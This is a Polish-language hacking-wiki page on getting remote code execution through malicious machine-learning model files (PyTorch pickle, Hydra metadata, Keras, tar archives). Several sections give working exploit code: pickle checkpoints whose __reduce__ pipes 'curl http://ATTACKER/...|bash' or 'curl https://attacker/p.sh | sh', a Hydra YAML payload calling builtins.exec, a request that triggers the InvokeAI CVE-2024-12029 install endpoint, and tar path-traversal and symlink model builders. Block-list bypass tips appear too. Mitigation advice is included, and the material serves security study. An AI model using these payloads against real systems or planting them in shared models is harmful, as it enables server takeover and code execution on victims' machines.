# RCE modeli

{{#include ../banners/hacktricks-training.md}}

## ≈Åadowanie modeli do RCE

Modele uczenia maszynowego sƒÖ zwykle udostƒôpniane w r√≥≈ºnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Te modele mogƒÖ byƒá ≈Çadowane na maszyny deweloper√≥w lub do system√≥w produkcyjnych w celu u≈ºycia. Zazwyczaj modele nie powinny zawieraƒá z≈Ço≈õliwego kodu, ale zdarzajƒÖ siƒô przypadki, w kt√≥rych model mo≈ºe zostaƒá u≈ºyty do wykonania dowolnego kodu na systemie ‚Äî jako zamierzona funkcja lub z powodu podatno≈õci w bibliotece ≈ÇadujƒÖcej model.

W momencie pisania oto kilka przyk≈Çad√≥w tego typu podatno≈õci:

| **Framework / Narzƒôdzie**  | **Podatno≈õƒá (CVE je≈õli dostƒôpne)**                                                                 | **Wektor RCE**                                                                                                                           | **Referencje**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niezabezpieczona deserializacja w* `torch.load` **(CVE-2025-32434)**                                                              | Z≈Ço≈õliwy pickle w checkpoint modelu prowadzi do wykonania kodu (obej≈õcie zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + z≈Ço≈õliwe pobranie modelu powoduje wykonanie kodu; RCE przez Java deserializacjƒô w API zarzƒÖdzania                                        | |
| **NVIDIA Merlin Transformers4Rec** | Niezabezpieczona deserializacja checkpointu przez `torch.load` **(CVE-2025-23298)**                                           | Nieufny checkpoint wywo≈Çuje pickle reducer podczas `load_model_trainer_states_from_checkpoint` ‚Üí wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczne YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | ≈Åadowanie modelu z YAML u≈ºywa `yaml.unsafe_load` (wykonanie kodu) <br> ≈Åadowanie modelu z warstwƒÖ **Lambda** uruchamia dowolny kod Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Specjalnie spreparowany `.tflite` model wywo≈Çuje overflow ca≈Çkowitoliczbowy ‚Üí corrupt pamiƒôci sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | ≈Åadowanie modelu przez `joblib.load` wykonuje pickle z payloadem atakujƒÖcego (`__reduce__`)                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *sporne*                                                                              | Domy≈õlne `numpy.load` pozwala na wczytywanie picklowanych tablic obiekt√≥w ‚Äì z≈Ço≈õliwe `.npy/.npz` wyzwalajƒÖ wykonanie kodu                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Zewnƒôtrzna ≈õcie≈ºka wag w modelu ONNX mo≈ºe uciec z katalogu (odczyt dowolnych plik√≥w) <br> Z≈Ço≈õliwy tar modelu ONNX mo≈ºe nadpisaƒá dowolne pliki (prowadzƒÖc do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model z niestandardowym operatorem wymaga za≈Çadowania natywnego kodu atakujƒÖcego; z≈Ço≈ºone grafy modelu mogƒÖ nadu≈ºywaƒá logiki do wykonania niezamierzonych oblicze≈Ñ   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | U≈ºycie API ≈Çadowania modeli z w≈ÇƒÖczonym `--model-control` pozwala na wzglƒôdne path traversal do zapisu plik√≥w (np. nadpisanie `.bashrc` dla RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 ‚Ä¶ 25668** (wiele heap overflow)                                                                         | Uszkodzony plik modelu GGUF powoduje przepe≈Çnienia bufora na stercie w parserze, umo≈ºliwiajƒÖc wykonanie dowolnego kodu na systemie ofiary                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Z≈Ço≈õliwy HDF5 (`.h5`) model z warstwƒÖ Lambda nadal wykonuje kod przy ≈Çadowaniu (Keras safe_mode nie obejmuje starego formatu ‚Äì ‚Äûdowngrade attack‚Äù) | |
| **Others** (general)        | *B≈ÇƒÖd projektowy* ‚Äì Pickle serialization                                                                                         | Wiele narzƒôdzi ML (np. formaty oparte na pickle, `pickle.load` w Pythonie) wykona dowolny kod osadzony w plikach modelu, je≈õli nie zastosowano mitigacji | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Niezaufane metadane przekazane do `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadane/config modelu kontrolowane przez atakujƒÖcego ustawiajƒÖ `_target_` na dowolny callable (np. `builtins.exec`) ‚Üí wykonywane podczas ≈Çadowania, nawet dla ‚Äûbezpiecznych‚Äù format√≥w (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istniejƒÖ modele oparte na pythonowym pickle, takie jak te u≈ºywane przez [PyTorch](https://github.com/pytorch/pytorch/security), kt√≥re mogƒÖ pos≈Çu≈ºyƒá do wykonania dowolnego kodu na systemie, je≈õli nie sƒÖ ≈Çadowane z `weights_only=True`. Zatem ka≈ºdy model oparty na pickle mo≈ºe byƒá szczeg√≥lnie podatny na tego typu ataki, nawet je≈õli nie jest wymieniony w powy≈ºszej tabeli.

### Hydra metadata ‚Üí RCE (dzia≈Ça nawet z safetensors)

`hydra.utils.instantiate()` importuje i wywo≈Çuje dowolny punktowany `_target_` w obiekcie konfiguracji/metadanych. Gdy biblioteki przekazujƒÖ **niezaufane metadane modelu** do `instantiate()`, atakujƒÖcy mo≈ºe dostarczyƒá callable i argumenty, kt√≥re uruchomiƒÖ siƒô natychmiast podczas ≈Çadowania modelu (bez potrzeby u≈ºycia pickle).

Przyk≈Çad ≈Çadunku (dzia≈Ça w `.nemo` `model_config.yaml`, repo `config.json`, lub `__metadata__` wewnƒÖtrz `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Kluczowe punkty:
- Wyzwalane przed inicjalizacjƒÖ modelu w NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders oraz FlexTok loaders.
- Mechanizm blokowania ciƒÖg√≥w w Hydra mo≈ºna obej≈õƒá poprzez alternatywne ≈õcie≈ºki importu (np. `enum.bltns.eval`) lub nazwy rozwiƒÖzywane przez aplikacjƒô (np. `nemo.core.classes.common.os.system` ‚Üí `posix`).
- FlexTok tak≈ºe parsuje metadane zapisane jako string przy u≈ºyciu `ast.literal_eval`, co umo≈ºliwia DoS (wybuch u≈ºycia CPU/pamiƒôci) przed wywo≈Çaniem Hydra.

### üÜï  InvokeAI RCE przez `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny otwarto≈∫r√≥d≈Çowy interfejs webowy dla Stable-Diffusion. Wersje **5.3.1 ‚Äì 5.4.2** udostƒôpniajƒÖ REST endpoint `/api/v2/models/install`, kt√≥ry pozwala u≈ºytkownikom pobieraƒá i ≈Çadowaƒá modele z dowolnych adres√≥w URL.

WewnƒÖtrz endpoint ostatecznie wywo≈Çuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Gdy dostarczony plik jest **PyTorch checkpoint (`*.ckpt`)**, `torch.load` wykonuje **pickle deserialization**. Poniewa≈º zawarto≈õƒá pochodzi bezpo≈õrednio z URL kontrolowanego przez u≈ºytkownika, atakujƒÖcy mo≈ºe osadziƒá z≈Ço≈õliwy obiekt z niestandardowƒÖ metodƒÖ `__reduce__` wewnƒÖtrz checkpointu; metoda ta jest wykonywana **during deserialization**, prowadzƒÖc do **remote code execution (RCE)** na serwerze InvokeAI.

Luka otrzyma≈Ça identyfikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Utw√≥rz z≈Ço≈õliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hostuj `payload.ckpt` na serwerze HTTP, kt√≥rym kontrolujesz (np. `http://ATTACKER/payload.ckpt`).
3. Wywo≈Çaj podatny endpoint (nie wymaga uwierzytelnienia):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Gdy InvokeAI pobiera plik, wywo≈Çuje `torch.load()` ‚Üí gad≈ºet `os.system` uruchamia siƒô i atakujƒÖcy uzyskuje wykonanie kodu w kontek≈õcie procesu InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje ca≈Çy proces.

#### Warunki

‚Ä¢  InvokeAI 5.3.1-5.4.2 (flaga scan domy≈õlnie **false**)  
‚Ä¢  `/api/v2/models/install` dostƒôpny dla atakujƒÖcego  
‚Ä¢  Proces ma uprawnienia do wykonywania polece≈Ñ shell

#### ≈örodki zaradcze

* Zaktualizuj do **InvokeAI ‚â• 5.4.3** ‚Äì poprawka ustawia `scan=True` domy≈õlnie i wykonuje skanowanie pod kƒÖtem malware przed deserializacjƒÖ.  
* Podczas programowego ≈Çadowania checkpoint√≥w u≈ºywaj `torch.load(file, weights_only=True)` lub nowego helpera [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Wymuszaj allow-lists / signatures dla ≈∫r√≥de≈Ç modeli i uruchamiaj us≈Çugƒô z zasadƒÖ najmniejszych uprawnie≈Ñ.

> ‚ö†Ô∏è Pamiƒôtaj, ≈ºe **ka≈ºdy** format oparty na Python pickle (w tym wiele `.pt`, `.pkl`, `.ckpt`, `.pth` files) jest z natury niebezpieczny do deserializacji ze ≈∫r√≥de≈Ç niegodnych zaufania.

---

Przyk≈Çad dora≈∫nego ≈õrodka zaradczego, je≈õli musisz utrzymaƒá starsze wersje InvokeAI dzia≈ÇajƒÖce za reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### üÜï NVIDIA Merlin Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

Transformers4Rec firmy NVIDIA (czƒô≈õƒá Merlin) ujawni≈Ç niebezpieczny loader checkpoint√≥w, kt√≥ry bezpo≈õrednio wywo≈Çywa≈Ç `torch.load()` na ≈õcie≈ºkach dostarczonych przez u≈ºytkownika. Poniewa≈º `torch.load` polega na Python `pickle`, checkpoint kontrolowany przez atakujƒÖcego mo≈ºe wykonaƒá dowolny kod za pomocƒÖ reducera podczas deserializacji.

Wra≈ºliwa ≈õcie≈ºka (przed poprawkƒÖ): `transformers4rec/torch/trainer/trainer.py` ‚Üí `load_model_trainer_states_from_checkpoint(...)` ‚Üí `torch.load(...)`.

Dlaczego to prowadzi do RCE: W Python `pickle` obiekt mo≈ºe zdefiniowaƒá reducer (`__reduce__`/`__setstate__`), kt√≥ry zwraca wywo≈Çywalny obiekt i argumenty. Wywo≈Çywalny obiekt jest uruchamiany podczas unpicklingu. Je≈õli taki obiekt znajduje siƒô w checkpointcie, wykonuje siƒô on zanim zostanƒÖ u≈ºyte jakiekolwiek wagi.

Minimalny przyk≈Çad z≈Ço≈õliwego checkpointu:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Wektory dostarczenia i zasiƒôg szk√≥d:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastƒÖpi≈Ç bezpo≈õrednie `torch.load()` ograniczonym, z listy dozwolonych deserializatorem zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader weryfikuje typy/pola i uniemo≈ºliwia wywo≈Çywanie dowolnych callable podczas ≈Çadowania.

Wytyczne obronne specyficzne dla PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Przyk≈Çad ‚Äì tworzenie z≈Ço≈õliwego modelu PyTorch

- Utw√≥rz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Za≈Çaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD udostƒôpnia endpoint `resnet`, kt√≥ry deserializes dane kontrolowane przez u≈ºytkownika. ZDI potwierdzi≈Ço, ≈ºe zdalny atakujƒÖcy mo≈ºe zmusiƒá ofiarƒô do za≈Çadowania z≈Ço≈õliwej strony/pliku, spowodowaƒá, by wys≈Ça≈Ça przygotowany serialized blob do tego endpointu, i wywo≈Çaƒá deserialization jako `root`, prowadzƒÖc do pe≈Çnego przejƒôcia.

Przebieg exploita odzwierciedla typowe pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Ka≈ºdy gadget osiƒÖgalny podczas deserialization (constructors, `__setstate__`, framework callbacks, itd.) mo≈ºna uzbroiƒá w ten sam spos√≥b, niezale≈ºnie od tego, czy transport by≈Ç HTTP, WebSocket, czy plikiem upuszczonym do monitorowanego katalogu.


## Modele do Path Traversal

Jak wspomniano w [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), wiƒôkszo≈õƒá format√≥w modeli u≈ºywanych przez r√≥≈ºne frameworki AI opiera siƒô na archiwach, zwykle `.zip`. W zwiƒÖzku z tym mo≈ºliwe jest nadu≈ºycie tych format√≥w w celu przeprowadzenia atak√≥w path traversal, pozwalajƒÖc na odczyt dowolnych plik√≥w z systemu, w kt√≥rym model jest ≈Çadowany.

Na przyk≈Çad, za pomocƒÖ poni≈ºszego kodu mo≈ºesz stworzyƒá model, kt√≥ry utworzy plik w katalogu `/tmp` podczas ≈Çadowania:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Alternatywnie, u≈ºywajƒÖc poni≈ºszego kodu mo≈ºesz utworzyƒá model, kt√≥ry po za≈Çadowaniu utworzy symlink do katalogu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dog≈Çƒôbna analiza: deserializacja .keras i gadget hunting

Aby uzyskaƒá szczeg√≥≈Çowy przewodnik po wewnƒôtrznych mechanizmach .keras, Lambda-layer RCE, problemie arbitrary import w ‚â§ 3.8 oraz odkrywaniu gadget√≥w po poprawce wewnƒÖtrz allowlist, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## ≈πr√≥d≈Ça

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog ‚Äì CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 ‚Äì Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
